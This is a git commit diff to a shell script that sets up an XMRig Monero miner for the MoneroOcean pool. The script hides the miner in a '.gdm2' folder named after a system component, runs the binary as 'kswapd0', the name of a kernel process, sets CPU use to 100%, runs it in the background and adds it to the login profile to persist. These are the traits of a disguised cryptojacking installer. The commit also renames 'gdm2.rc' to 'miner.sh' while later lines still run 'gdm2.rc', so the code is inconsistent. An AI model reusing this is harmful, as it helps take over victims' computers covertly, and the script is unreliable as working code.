b8dded8b826654e4d0060cf7b3c33567b486514b
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-03-11 18:49:37 +0100

    Update setup_moneroocean_miner_gdm2.sh

--- setup_moneroocean_miner_gdm2.sh
+++ setup_moneroocean_miner_gdm2.sh
@@ -20,7 +20,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_moneroocean_gdm2.rc <wallet address> [<your email address>]"
+  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -231,7 +231,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gd
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
@@ -242,7 +242,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 killall xmrig
 
 echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
-cat >$HOME/.gdm2/gdm2.rc <<EOL
+cat >$HOME/.gdm2/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
   nice $HOME/.gdm2/kswapd0 \$*
@@ -252,7 +252,7 @@ else
 fi
 EOL
 
-chmod +x $HOME/.gdm2/gdm2.rc
+chmod +x $HOME/.gdm2/miner.sh
 
 # preparing script background work and work under reboot
 
@@ -263,7 +263,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/log file)"
+  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
   /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
@@ -325,5 +325,3 @@ fi
 echo ""
 
 echo "[*] Setup complete"
-
-
